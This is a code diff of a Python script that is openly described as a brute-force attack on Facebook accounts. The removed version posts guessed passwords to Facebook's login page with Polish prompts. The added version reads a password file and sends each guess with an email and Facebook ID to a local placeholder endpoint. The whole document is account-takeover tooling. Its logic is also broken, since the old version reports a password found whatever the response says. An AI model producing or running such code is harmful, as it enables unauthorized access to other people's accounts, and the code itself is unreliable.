@@ -1,41 +1,39 @@
 import requests
-import time
-import re
 
-def brute_force(username, password):
-    url = "https://www.facebook.com/login.php"
-    payload = {
-        "email": username,
-        "password": password,
-        "login": "Log In"
-    }
-    response = requests.post(url, data=payload)
+# Local API details
+local_api_url = "http://127.0.0.1:5000/your-api-endpoint"
 
-    if response.status_code != 200:
-        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
-        return False
+# Function to perform brute force attack without Tor proxy
+def brute_force(username, fb_id, passwords):
+    for password in passwords:
+        try:
+            # Example: Make a request to the local API without using a proxy
+            result = requests.get(local_api_url, params={'username': username, 'password': password}, timeout=10)
 
-    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]+$', username):
-        print("Niepoprawna nazwa użytkownika.")
-        return False
+            # Process result as needed
+            print(result.text)
+        except requests.exceptions.RequestException as e:
+            print(f"Request Error: {e}")
 
-    if not re.match(r'^[a-zA-Z0-9_.+-]+$', password):
-        print("Niepoprawne hasło.")
-        return False
+        # Rest of your brute-force logic
+        # ...
 
-    print("Znaleziono hasło:", password)
-    return True
+# Function to read passwords from a file
+def read_passwords(file_path):
+    with open(file_path, 'r') as file:
+        return file.read().splitlines()
 
+# Function to execute the main brute-force attack
 def main():
-    username = input("Podaj nazwę użytkownika: ")
-    password_list = ["hasło1", "hasło2", "hasło3", ...]
+    username = input("Enter email address (as username): ")
+    fb_id = input("Enter Facebook ID: ")
+    password_file = input("Enter the password file name: ")
 
-    for password in password_list:
-        if brute_force(username, password):
-            break
+    # Read passwords from file
+    passwords = read_passwords(password_file)
 
-    else:
-        print("Nie znaleziono hasła.")
+    # Perform brute-force attack
+    brute_force(username, fb_id, passwords)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
